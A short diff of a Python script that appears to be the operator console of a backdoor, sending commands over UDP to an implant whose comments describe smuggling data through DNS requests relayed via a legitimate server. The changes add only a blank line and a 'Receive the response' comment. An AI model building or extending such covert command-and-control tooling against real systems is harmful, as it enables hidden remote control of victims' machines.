@@ -32,6 +32,7 @@ if __name__ == "__main__":
     # decodes the attached information, and forwards the DNS request to a legitimate server,
     # then forwards the legitmate response back to the backdoor.
 
+
     # Main shell loop
     print_menu()
     while True:
@@ -54,6 +55,8 @@ if __name__ == "__main__":
                 data = args[0] + " " + args[1]
                 # Send the command to backdoor.
                 send_udp("10.0.0.131", data, encryption_handler)
+                # Receive the response.
+                
                 # Now we need a way of checking for the response.
                 # Each response will be packaged as follows:
                 # responseID data
